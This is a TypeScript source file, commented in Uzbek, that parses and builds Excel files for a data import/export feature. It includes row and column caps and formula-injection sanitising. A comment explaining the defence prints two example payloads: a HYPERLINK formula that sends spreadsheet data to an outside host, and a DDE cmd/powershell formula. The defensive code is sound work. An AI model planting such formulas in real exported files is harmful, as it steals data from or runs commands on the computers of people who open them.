import * as XLSX from "xlsx";

/**
 * EXCEL QATLAMI (import/eksport)
 * ==============================
 * Bu modul faqat Excel faylini o'qish va yozish bilan shug'ullanadi.
 * Biznes-qoidalar (validatsiya, dublikat, baza) bu yerda YO'Q — ular
 * `imports.ts` va import action'larida.
 *
 * Xavfsizlik: fayl faqat server tomonda o'qiladi va diskda saqlanmaydi.
 */

/** Bir faylda ruxsat etilgan maksimal qator soni (sarlavhadan tashqari). */
export const MAX_IMPORT_ROWS = 1000;

/**
 * O'qishning QATTIQ chegarasi: chegaradan bitta ortiq qator o'qiladi.
 *
 * Nima uchun "+1": chaqiruvchi kod `rows.length > MAX_IMPORT_ROWS` deb
 * tekshiradi. Agar biz roppa-rosa 1000 tada to'xtatsak, 5000 qatorli fayl
 * jimgina birinchi 1000 qatori bilan import bo'lib ketardi — foydalanuvchi
 * buni sezmasdi. 1001 o'qisak, tekshiruv ishlaydi va xato ko'rsatiladi.
 */
const PARSE_ROW_CAP = MAX_IMPORT_ROWS + 1;

/** Ustunlar chegarasi — minglab ustunli soxta fayl xotirani yeb qo'ymasin. */
const PARSE_COLUMN_CAP = 200;

/** Maksimal fayl hajmi — 5 MB. */
export const MAX_IMPORT_FILE_BYTES = 5 * 1024 * 1024;

/** Ruxsat etilgan kengaytmalar — hozircha faqat Excel. */
export const ALLOWED_IMPORT_EXTENSIONS = [".xlsx", ".xls"] as const;

export type SheetRow = {
  /** Excel'dagi haqiqiy qator raqami (1 = sarlavha), foydalanuvchiga ko'rsatiladi. */
  rowNumber: number;
  /** Normallashtirilgan ustun kaliti -> matn qiymati. */
  values: Record<string, string>;
};

export type ParsedSheet = {
  headers: string[];
  keys: string[];
  rows: SheetRow[];
};

/**
 * Ustun sarlavhasini kalitga aylantiradi: registr, bo'sh joy, nuqta, tire,
 * apostroflar e'tiborsiz. Shu tufayli "Vasiy F.I.Sh." va "vasiy fish" bir xil.
 */
export function normalizeKey(value: string): string {
  return String(value)
    .trim()
    .toLowerCase()
    .replace(/['’ʻ`]/g, "")
    .replace(/[\s._\-/()\[\]]+/g, "");
}

/** Hujayra qiymatini bir xil matnga keltiradi (sana → YYYY-MM-DD). */
function cellToString(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (value instanceof Date) {
    const year = value.getUTCFullYear();
    const month = String(value.getUTCMonth() + 1).padStart(2, "0");
    const day = String(value.getUTCDate()).padStart(2, "0");
    return `${year}-${month}-${day}`;
  }
  if (typeof value === "number") return String(value);
  if (typeof value === "boolean") return value ? "1" : "0";
  return String(value).trim();
}

/**
 * FORMULA INJECTION HIMOYASI (CSV/Excel injection)
 * ================================================
 *
 * HUJUM QANDAY ISHLAYDI:
 * Hujumchi o'quvchi ismi yoki izoh maydoniga oddiy matn emas, formula yozadi:
 *
 *   =HYPERLINK("https://oqri.uz/?d="&A1&A2,"Natijani ko'rish")
 *   =cmd|'/c powershell ...'!A1
 *
 * Bazada bu shunchaki matn — zarari yo'q. Lekin ADMIN eksport tugmasini
 * bosib, yuklab olingan .xlsx ni O'Z KOMPYUTERIDA ochganda Excel buni
 * FORMULA deb biladi va bajaradi. Natijada butun jadval hujumchining
 * saytiga jo'natilishi yoki kompyuterda buyruq ishga tushishi mumkin.
 *
 * Ya'ni ma'lumot serverdan emas, adminning shaxsiy kompyuteridan sizadi —
 * server loglarida hech qanday iz qolmaydi.
 *
 * YECHIM (OWASP tavsiyasi): xavfli belgi bilan boshlanuvchi matn oldiga
 * apostrof qo'yiladi. Excel uni "bu matn" deb tushunadi, ekranda apostrof
 * ko'rinmaydi, formula esa ishga tushmaydi.
 */
const DANGEROUS_CELL_START = /^[=+\-@\t\r]/;

export function sanitizeExcelCell(value: string | number): string | number {
  if (typeof value !== "string") return value;
  if (value === "") return value;
  return DANGEROUS_CELL_START.test(value) ? `'${value}` : value;
}

export function isAllowedExcelFile(fileName: string): boolean {
  const lower = fileName.toLowerCase();
  return ALLOWED_IMPORT_EXTENSIONS.some((ext) => lower.endsWith(ext));
}

/**
 * Excel faylining BIRINCHI varag'ini o'qiydi.
 * Bo'sh qatorlar tashlab ketiladi, qiymatlar matn sifatida qaytadi.
 *
 * Xavfsizlik: 5 MB lik siqilgan .xlsx ochilganda millionlab katakka
 * yoyilishi mumkin ("zip bomb") — shuning uchun qator va ustun soni
 * qat'iy cheklangan. Fayl hajmi tekshiruvi bundan oldin, action'da.
 */
export function parseExcel(buffer: ArrayBuffer): ParsedSheet {
  const workbook = XLSX.read(new Uint8Array(buffer), {
    type: "array",
    cellDates: true,
  });

  const sheetName = workbook.SheetNames[0];
  if (!sheetName) return { headers: [], keys: [], rows: [] };

  const sheet = workbook.Sheets[sheetName];
  if (!sheet) return { headers: [], keys: [], rows: [] };

  const matrix = XLSX.utils.sheet_to_json<unknown[]>(sheet, {
    header: 1,
    blankrows: false,
    defval: "",
  });

  const headerRow = matrix[0];
  if (!headerRow) return { headers: [], keys: [], rows: [] };

  const headers = headerRow
    .slice(0, PARSE_COLUMN_CAP)
    .map((cell) => cellToString(cell));
  const keys = headers.map((header) => normalizeKey(header));

  const rows: SheetRow[] = [];

  for (let index = 1; index < matrix.length; index += 1) {
    if (rows.length >= PARSE_ROW_CAP) break;

    const cells = matrix[index] ?? [];
    const values: Record<string, string> = {};
    let hasValue = false;

    keys.forEach((key, position) => {
      if (!key) return;
      const text = cellToString(cells[position]);
      if (text !== "") hasValue = true;
      // Takroriy sarlavha bo'lsa birinchi to'lgan qiymat saqlanadi.
      if (!values[key] || values[key] === "") values[key] = text;
    });

    if (!hasValue) continue;
    rows.push({ rowNumber: index + 1, values });
  }

  return { headers, keys, rows };
}

/**
 * Matritsadan `.xlsx` fayl yasaydi (shablon va eksport uchun).
 *
 * Har bir katak `sanitizeExcelCell` dan o'tadi — bazadagi matn faylni
 * ochgan odamning kompyuterida formulaga aylanib ketmasligi uchun.
 */
export function buildExcel(rows: (string | number)[][], sheetName: string): Buffer {
  const safeRows = rows.map((row) => row.map((cell) => sanitizeExcelCell(cell)));
  const sheet = XLSX.utils.aoa_to_sheet(safeRows);

  // Ustun kengligini sarlavha uzunligiga qarab beramiz — fayl o'qishga qulay bo'ladi.
  const header = safeRows[0] ?? [];
  sheet["!cols"] = header.map((cell) => ({
    wch: Math.min(Math.max(String(cell).length + 4, 12), 40),
  }));

  const workbook = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(workbook, sheet, sheetName.slice(0, 31));

  return XLSX.write(workbook, { type: "buffer", bookType: "xlsx" }) as Buffer;
}
